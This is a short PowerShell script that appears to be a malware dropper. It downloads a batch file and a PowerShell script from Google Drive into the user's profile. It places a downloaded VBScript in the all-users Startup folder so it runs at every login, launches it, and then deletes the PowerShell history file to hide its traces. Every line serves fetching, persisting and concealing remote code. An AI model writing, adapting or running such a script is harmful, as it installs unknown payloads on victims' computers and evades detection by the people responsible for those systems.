cd "$env:USERPROFILE"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -OutFile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -OutFile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1GFyhlHfump8_H-SwNXQBrJBLEV3nqcmr" -OutFile "startup.vbs"
Start-Process "wscript.exe" -ArgumentList "startup.vbs"
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
